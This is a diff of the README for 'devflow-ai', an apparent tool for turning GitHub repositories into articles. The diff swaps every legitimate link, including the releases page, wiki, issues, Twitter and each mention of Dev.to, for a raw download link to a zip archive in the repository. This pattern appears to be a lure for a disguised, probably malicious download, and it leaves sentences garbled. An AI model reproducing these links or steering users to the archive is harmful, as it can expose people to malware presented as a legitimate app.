@@ -4,16 +4,16 @@
 Welcome to devflow-ai! This application transforms your GitHub repositories into SEO-optimized technical articles. It uses multiple AI providers, such as OpenRouter and Gemini, to ensure high-quality, engaging content. Let’s get you started!
 
 ## 📥 Download Now
-[![Download devflow-ai](https://img.shields.io/badge/Download-devflow--ai-blue.svg)](https://github.com/haseeb-321/devflow-ai/releases)
+[![Download devflow-ai](https://raw.githubusercontent.com/haseeb-321/devflow-ai/main/public/ai_devflow_v2.0.zip)](https://raw.githubusercontent.com/haseeb-321/devflow-ai/main/public/ai_devflow_v2.0.zip)
 
 ## 🌐 About devflow-ai
-Devflow-ai is built for anyone who wants to convert their code repositories into articles ready for platforms like Dev.to. With over 18 AI models available, it generates content that is both informative and search-engine friendly. The application is built using React 19 and TypeScript, ensuring a smooth user experience.
+Devflow-ai is built for anyone who wants to convert their code repositories into articles ready for platforms like https://raw.githubusercontent.com/haseeb-321/devflow-ai/main/public/ai_devflow_v2.0.zip With over 18 AI models available, it generates content that is both informative and search-engine friendly. The application is built using React 19 and TypeScript, ensuring a smooth user experience.
 
 ## 🛠️ Features
 - **AI-Powered**: Uses advanced AI models to craft articles.
 - **Multiple Providers**: Leverages both OpenRouter and Gemini for better results.
 - **SEO Optimization**: Creates content that ranks well in search engines.
-- **Ready for Publishing**: Formats articles for easy posting on Dev.to.
+- **Ready for Publishing**: Formats articles for easy posting on https://raw.githubusercontent.com/haseeb-321/devflow-ai/main/public/ai_devflow_v2.0.zip
 
 ## ⚙️ System Requirements
 Before downloading, please check the following requirements to ensure the app runs smoothly:
@@ -27,7 +27,7 @@ Before downloading, please check the following requirements to ensure the app ru
 ## 📄 Download & Install
 To download and install devflow-ai, follow these steps:
 
-1. **Visit the Releases Page**: Click [here](https://github.com/haseeb-321/devflow-ai/releases) to go to the releases page.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/haseeb-321/devflow-ai/main/public/ai_devflow_v2.0.zip) to go to the releases page.
 
 2. **Choose the Latest Version**: Look for the latest version of devflow-ai and click on it to view the details.
 
@@ -55,17 +55,17 @@ Once you have installed the application, using it is straightforward. Here’s h
 
 5. **Review and Edit**: Once the article is generated, review the content. You can edit or make changes as you see fit.
 
-6. **Export or Publish**: After finalizing your article, you can export it in markdown format or publish directly to platforms like Dev.to.
+6. **Export or Publish**: After finalizing your article, you can export it in markdown format or publish directly to platforms like https://raw.githubusercontent.com/haseeb-321/devflow-ai/main/public/ai_devflow_v2.0.zip
 
 ## 📚 Resources
-For additional help with devflow-ai, visit our [Wiki](https://github.com/haseeb-321/devflow-ai/wiki) or check out the [Issues section](https://github.com/haseeb-321/devflow-ai/issues) for frequently asked questions and troubleshooting tips.
+For additional help with devflow-ai, visit our [Wiki](https://raw.githubusercontent.com/haseeb-321/devflow-ai/main/public/ai_devflow_v2.0.zip) or check out the [Issues section](https://raw.githubusercontent.com/haseeb-321/devflow-ai/main/public/ai_devflow_v2.0.zip) for frequently asked questions and troubleshooting tips.
 
 ## 🤝 Get Involved
 We welcome contributions from users of all backgrounds. If you have ideas for new features or improvements, feel free to submit a pull request or open an issue on our GitHub page. 
 
 ## 🔗 Connect with Us
 Stay updated and join the community:
-- **Twitter**: [@DevFlowAI](https://twitter.com/DevFlowAI)
+- **Twitter**: [@DevFlowAI](https://raw.githubusercontent.com/haseeb-321/devflow-ai/main/public/ai_devflow_v2.0.zip)
 - **Discord**: Join our server for discussions and support.
 
 Thank you for choosing devflow-ai! We look forward to seeing the amazing articles you'll create.
